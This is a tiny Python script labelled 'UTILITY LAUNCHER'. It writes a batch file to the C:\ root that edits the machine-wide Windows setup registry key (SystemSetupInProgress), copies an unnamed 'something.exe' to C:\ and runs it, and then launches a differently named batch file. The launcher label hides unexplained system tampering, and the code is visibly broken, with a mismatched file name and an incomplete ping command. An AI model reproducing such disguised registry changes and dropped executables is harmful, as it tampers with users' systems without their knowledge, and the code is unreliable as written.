import os
print("UTILITY LAUNCHER")
with open("c:\\dosexec.bat","w")as f:
    f.write("reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 0 /f\nping localhost -n \ncls\ncd C:\\ \nsomething.exe")
    f.close()
os.system("copy something.exe C:\\something.exe")
os.system("pause")
os.system("msdos.bat")